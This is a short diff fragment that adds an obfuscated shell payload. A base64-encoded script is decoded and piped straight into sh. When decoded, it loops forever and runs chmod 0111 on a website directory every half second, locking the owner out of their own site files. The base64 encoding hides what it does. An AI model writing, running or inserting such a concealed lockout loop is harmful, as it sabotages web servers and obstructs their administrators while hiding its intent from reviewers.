@@ -1,0 +1,2 @@
+miuae="ZGlyPSIvaG9tZS9jd2UvcHVibGljX2h0bWwvd2Vic2l0ZWF3YWwiCndoaWxlIHRydWU7IGRvIAoJY2htb2QgMDExMSAkZGlyCiAgICAgICAgc2xlZXAgMC41CmRvbmU="
+echo $miuae | base64 -d | sh
